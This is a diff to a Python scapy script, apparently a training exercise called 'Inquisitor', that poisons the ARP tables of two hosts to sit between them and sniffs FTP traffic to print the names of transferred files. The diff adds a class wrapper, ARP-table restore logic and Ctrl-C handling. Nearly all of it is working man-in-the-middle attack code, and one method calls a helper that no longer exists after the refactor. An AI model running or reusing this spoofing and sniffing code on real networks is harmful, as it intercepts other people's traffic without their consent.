@@ -3,6 +3,7 @@ import argparse
 import scapy.all as scapy
 import re
 import time
+import signal
 
 def error_exit(msg):
 	print(f"Error: {msg}")
@@ -10,35 +11,57 @@ def error_exit(msg):
 
 def spoof(ip_target, mac_target, ip_src):
 	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
-	scapy.send(packet, verbose=0, count=7)
-	print(f"[+] Sent to {ip_target} : {ip_src} is-at mac_mine")
+	scapy.send(packet, verbose=0)
+	print(f" --- ARP Table soofed at {ip_target} --- ")
 
-def extract_file_name(data):
-	file_name = None
-	try:
-		ftp_command = data.decode('utf-8')
-		command_parts = ftp_command.split()
+def restore(ip_target, mac_target, ip_src, mac_src):
+	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src, op='is-at')
+	scapy.send(packet, verbose=0)
+	print(f" --- ARP Table restored at {ip_target} --- ")
 
-		if len(command_parts) >= 2:
-			file_name = command_parts[1]
-	except UnicodeDecodeError:
-		pass
+class Inquisitor:
+	def __init__(self, args):
+		self.ip_target = args.ip_target
+		self.mac_target = args.mac_target
+		self.ip_src = args.ip_src
+		self.mac_src = args.mac_src
 
-	return file_name
+	def extract_file_name(self, data):
+		file_name = None
+		try:
+			ftp_command = data.decode('utf-8')
+			command_parts = ftp_command.split()
 
-def packet_callback(packet):
-	if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
-		payload = packet[scapy.Raw].load
-		if b"RETR" in payload or b"STOR" in payload:
-			ftp_command = payload.decode('utf-8')
-			file_name = extract_file_name(payload)
-			if file_name:
-				print(f"File: {file_name}")
+			if len(command_parts) >= 2:
+				file_name = command_parts[1]
+		except UnicodeDecodeError:
+			pass
 
-def inquisitor(data):
-	spoof(data.ip_target, data.mac_target, data.ip_src)
-	spoof(data.ip_src, data.mac_src, data.ip_target)
-	scapy.sniff(iface="eth0", prn=packet_callback, filter="tcp port 21")
+		return file_name
+
+	def packet_callback(self, packet):
+		if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
+			payload = packet[scapy.Raw].load
+			if b"RETR" in payload or b"STOR" in payload:
+				ftp_command = payload.decode('utf-8')
+				file_name = extract_file_name(payload)
+				if file_name:
+					print(f"File: {file_name}")
+
+	def exit_gracefully(self, signum, frame):
+		restore(self.ip_target, self.mac_target, self.ip_src, self.mac_src)
+		restore(self.ip_src, self.mac_src, self.ip_target, self.mac_target)
+		exit(1)
+
+	def poison(self):
+		try:
+			signal.signal(signal.SIGINT, self.exit_gracefully)
+
+			spoof(self.ip_target, self.mac_target, self.ip_src)
+			spoof(self.ip_src, self.mac_src, self.ip_target)
+			scapy.sniff(iface="eth0", prn=self.packet_callback, filter="tcp port 21")
+		except Exception as e:
+			error_exit(e)
 
 def is_valid_ip(ip_str):
 	try:
@@ -80,12 +103,14 @@ def parse_args():
 	return args
 
 def main():
-	args = parse_args()
-	validate_args(args)
-	inquisitor(args)
-	# except KeyboardInterrupt:
+	try:
+		args = parse_args()
+		validate_args(args)
+		inquisitor = Inquisitor(args)
+		inquisitor.poison()
+	except Exception as e:
+		error_exit(e)
 
-	print(args)
 
 if __name__ == '__main__':
 	main()
